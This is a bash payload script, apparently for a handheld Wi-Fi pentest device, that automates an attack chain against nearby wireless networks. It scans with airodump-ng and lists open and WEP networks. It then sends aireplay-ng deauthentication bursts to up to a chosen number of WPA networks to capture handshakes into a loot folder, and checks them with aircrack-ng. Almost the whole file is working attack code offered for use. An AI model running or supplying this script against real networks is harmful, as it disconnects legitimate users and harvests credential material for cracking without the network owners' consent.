#!/bin/bash
# Title: ZeroClick - Automated Attack Chain
# Author: bad-antics
# Description: Automated scan, identify, and capture
# Category: nullsec/auto

LOOT_DIR="/mmc/nullsec/zeroclick"
mkdir -p "$LOOT_DIR"

PROMPT "ZEROCLICK AUTO-ATTACK

Automated attack chain:
1. Scan all networks
2. Identify weak targets
3. Capture handshakes

Requires confirmation
before each stage.

Press OK to configure."

MON_IF=""
for iface in wlan1mon wlan2mon wlan0mon; do
    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
done
[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!"; exit 1; }

SCAN_TIME=$(NUMBER_PICKER "Scan time (seconds):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SCAN_TIME=30 ;; esac

MAX_TARGETS=$(NUMBER_PICKER "Max targets to attack:" 5)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_TARGETS=5 ;; esac

resp=$(CONFIRMATION_DIALOG "START ZEROCLICK?

Scan time: ${SCAN_TIME}s
Max targets: $MAX_TARGETS
Interface: $MON_IF

Will scan, identify, and
capture from weak networks.

Press OK to begin.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

# Stage 1: Scan
LOG "Stage 1: Scanning..."
SPINNER_START "Scanning all networks..."
rm -f /tmp/zeroclick*
timeout "$SCAN_TIME" airodump-ng "$MON_IF" --output-format csv -w /tmp/zeroclick 2>/dev/null &
sleep "$SCAN_TIME"
killall airodump-ng 2>/dev/null
SPINNER_STOP

# Stage 2: Identify targets
LOG "Stage 2: Identifying targets..."
VULN_FILE="$LOOT_DIR/vulnerable_$(date +%Y%m%d_%H%M).txt"
echo "=== Vulnerable Networks ===" > "$VULN_FILE"
grep -E "OPN|WEP" /tmp/zeroclick-01.csv 2>/dev/null >> "$VULN_FILE"
OPEN_COUNT=$(grep -c "OPN\|WEP" "$VULN_FILE" 2>/dev/null || echo 0)

WPA_FILE="/tmp/zc_wpa_targets.txt"
grep -iE "WPA" /tmp/zeroclick-01.csv 2>/dev/null | head -"$MAX_TARGETS" > "$WPA_FILE"
WPA_COUNT=$(wc -l < "$WPA_FILE" 2>/dev/null || echo 0)

resp=$(CONFIRMATION_DIALOG "SCAN RESULTS:

Open/WEP: $OPEN_COUNT
WPA targets: $WPA_COUNT

Capture handshakes from
WPA networks?

Press OK to continue.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && { rm -f /tmp/zeroclick*; exit 0; }

# Stage 3: Capture handshakes
LOG "Stage 3: Capturing handshakes..."
HS_COUNT=0

while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 x7 x8 x9 x10 x11 essid rest; do
    bssid=$(echo "$bssid" | tr -d ' ')
    channel=$(echo "$channel" | tr -d ' ')
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    [ -z "$channel" ] && continue

    LOG "Attacking $bssid CH:$channel..."
    iwconfig "$MON_IF" channel "$channel" 2>/dev/null
    CAP_FILE="$LOOT_DIR/hs_${bssid//:/}"
    airodump-ng -c "$channel" --bssid "$bssid" -w "$CAP_FILE" "$MON_IF" 2>/dev/null &
    sleep 5
    aireplay-ng -0 5 -a "$bssid" "$MON_IF" 2>/dev/null
    sleep 20
    aireplay-ng -0 5 -a "$bssid" "$MON_IF" 2>/dev/null
    sleep 10
    killall airodump-ng aireplay-ng 2>/dev/null

    if [ -f "${CAP_FILE}-01.cap" ] && aircrack-ng "${CAP_FILE}-01.cap" 2>&1 | grep -q "1 handshake"; then
        HS_COUNT=$((HS_COUNT + 1))
        LOG "Handshake captured!"
    fi
done < "$WPA_FILE"

rm -f /tmp/zeroclick* "$WPA_FILE" 2>/dev/null

PROMPT "ZEROCLICK COMPLETE

Open/WEP found: $OPEN_COUNT
WPA targets: $WPA_COUNT
Handshakes captured: $HS_COUNT

Results: $LOOT_DIR/

Press OK to exit."
